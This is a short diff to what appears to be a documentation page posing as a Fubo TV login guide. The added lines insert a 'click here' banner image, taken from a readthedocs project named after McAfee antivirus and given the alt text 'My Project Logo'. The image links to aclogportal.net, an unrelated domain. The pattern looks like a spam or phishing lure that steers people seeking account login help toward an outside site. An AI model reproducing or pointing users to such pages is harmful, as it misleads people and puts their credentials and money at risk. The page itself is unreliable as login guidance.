@@ -11,6 +11,12 @@ Introduction
 
 Fubo TV is a popular streaming platform that offers live sports, entertainment, and news channels. To enjoy its features, you need to access your account properly.
 
+.. image:: https://mcafee-antivirus.readthedocs.io/en/latest/_images/click-here.gif
+   :alt: My Project Logo
+   :width: 400px
+   :align: center
+   :target: https://aclogportal.net/
+
 This guide explains how to log in to your Fubo TV account step by step in a simple and user-friendly way.
 
 
